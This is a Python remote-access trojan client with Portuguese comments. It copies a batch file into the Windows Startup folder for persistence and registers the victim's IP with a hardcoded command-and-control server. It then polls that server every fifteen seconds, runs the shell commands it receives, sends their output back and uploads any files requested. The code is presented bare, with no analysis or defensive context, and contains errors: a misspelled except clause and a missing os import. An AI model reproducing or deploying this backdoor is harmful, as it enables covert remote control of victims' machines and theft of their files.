import time
import requests
import string
import random
import subprocess

try:
    os.system(r'COPY "C:\Users\%username%\_tmp_\_sc.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\_sc.bat"')
exception:
    ...
    
host = 'http://3.85.122.241/'
host_id = (''.join(random.choice(string.ascii_letters) for i in range(12)))

try:
    host_external_ip = requests.get("https://www.myexternalip.com/raw").text
except:
    host_external_ip = "ERROR"
    
host_tag = f'{host_external_ip}:{host_id}'
print(host_tag)

while True:
    try:
        # Verificar se o ID e o IP já estão catalogados.
        if host_tag not in requests.get(f'{host}/globo_ips.txt').text:
            requests.post(f'{host}/globo_client.php', data={'ip': f'{host_external_ip}:{host_id}'})

        # Verificar se há comandos para o host.
        command = requests.get(f'{host}/globo_command.txt').text
        if command:
            command = command.split(" ")
            if command[1] == host_tag:
                if command[0] == 'c':
                    requests.post(f'{host}/globo_cmd_output.php', data={'output': f'{subprocess.getoutput(command[2])}'})

                elif command[0] == "get":
                    new_string = command[2].replace('"', '')
                    files = {'file': open(new_string, 'rb')}
                    requests.post(f'{host}/globo_file.php', files=files)

    # Except geral.
    except:
        ...
    time.sleep(15)
